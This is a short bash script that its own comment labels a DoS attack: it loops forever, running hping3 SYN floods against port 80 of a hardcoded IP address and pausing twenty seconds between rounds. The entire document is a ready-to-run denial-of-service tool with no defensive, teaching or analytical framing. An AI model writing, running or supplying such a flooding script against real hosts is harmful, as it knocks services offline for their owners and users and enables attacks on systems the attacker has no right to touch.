#!/bin/bash

# DoS attack using hping3 
TARGET=123.100.10.1

while :; 
    sudo hping3 -S --flood -V -c 5000 -p 80 $TARGET 
do sleep 20 ; done